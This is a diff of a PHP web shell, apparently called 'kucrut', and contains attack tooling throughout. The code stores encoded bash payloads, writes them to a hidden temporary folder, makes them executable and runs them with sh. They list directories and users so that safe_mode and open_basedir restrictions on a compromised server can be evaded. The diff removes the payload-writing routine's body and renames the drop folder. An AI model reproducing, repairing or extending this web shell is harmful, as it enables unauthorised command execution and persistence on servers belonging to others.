@@ -1979,19 +1979,6 @@ function kucrutcheckfiletype(){
 }
 function kucrutWriteTocgiapi($name, $source){
 	$temp = "";
-	$not_api = array("basedir.kucrut", "getdir.kucrut", "getheader.kucrut");
-	if(in_array($name, $not_api)){
-		$temp = KUCRUT_TEMPDIR;
-		if($temp){
-			@chdir($temp);
-		}
-	}else{
-	
-		@chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
-	}
-	@mkdir('Utpu0RluKqI',0755);
-	__write_file("Utpu0RluKqI/".$name, __get_resource($source));
-	@chmod("Utpu0RluKqI/".$name, 0755);
 	return $temp;
 }
 function kucrutcheckcgi(){if(strlen(kucrutEx("id",false,true,true))>0)echo("ok");else echo("no");}
@@ -2000,7 +1987,7 @@ function kucrutupdateheader(){
 		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
 		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
 		$tmp_path = kucrutWriteTocgiapi("getheader.kucrut",$bash);
-		$data = kucrutEx("cd '{$tmp_path}/Utpu0RluKqI';sh getheader.kucrut",false,true,true);
+		$data = kucrutEx("cd '{$tmp_path}/kucrutcgiapi';sh getheader.kucrut",false,true,true);
 		if(@is_array(@json_decode($data,true))){
 			__kucrut_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
 			echo $data;
@@ -2638,13 +2625,13 @@ if($dirContent === false){
 	if(_kucrut_can_runCommand(true,true)){
 		$tmp_getdir_path = @$_COOKIE["kucrutchdir_bash_path"];
 		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_COOKIE["kucrutchdir_bash"])||@!file_exists($tmp_getdir_path."/Utpu0RluKqI/getdir.kucrut")){
+		if(!isset($_COOKIE["kucrutchdir_bash"])||@!file_exists($tmp_getdir_path."/kucrutcgiapi/getdir.kucrut")){
 			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
 			$tmp_getdir_path = kucrutWriteTocgiapi("getdir.kucrut",$bash);
 			__kucrut_set_cookie("kucrutchdir_bash", "true");
 			__kucrut_set_cookie("kucrutchdir_bash_path", $tmp_getdir_path);
 		}
-		$dirContent = kucrutEx("cd ".$tmp_getdir_path."/Utpu0RluKqI;sh getdir.kucrut '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
+		$dirContent = kucrutEx("cd ".$tmp_getdir_path."/kucrutcgiapi;sh getdir.kucrut '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
 		$dirContent = json_decode($dirContent, true);
 		if(is_array($dirContent)){
 			array_pop($dirContent);
@@ -5122,7 +5109,7 @@ $safe_mode = @ini_get('safe_mode');
 if(_kucrut_can_runCommand(true,false)&&($basedir||$safe_mode)){
 $bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
 $tmp_path = kucrutWriteTocgiapi("basedir.kucrut",$bash);
-$bash_users  = kucrutEx("cd ".$tmp_path."/Utpu0RluKqI;sh basedir.kucrut ".$makepwd,false,true,true);
+$bash_users  = kucrutEx("cd ".$tmp_path."/kucrutcgiapi;sh basedir.kucrut ".$makepwd,false,true,true);
 $users = json_decode($bash_users, true);
 $x=count($users);
 if($x>=2){array_pop($users);--$x;}
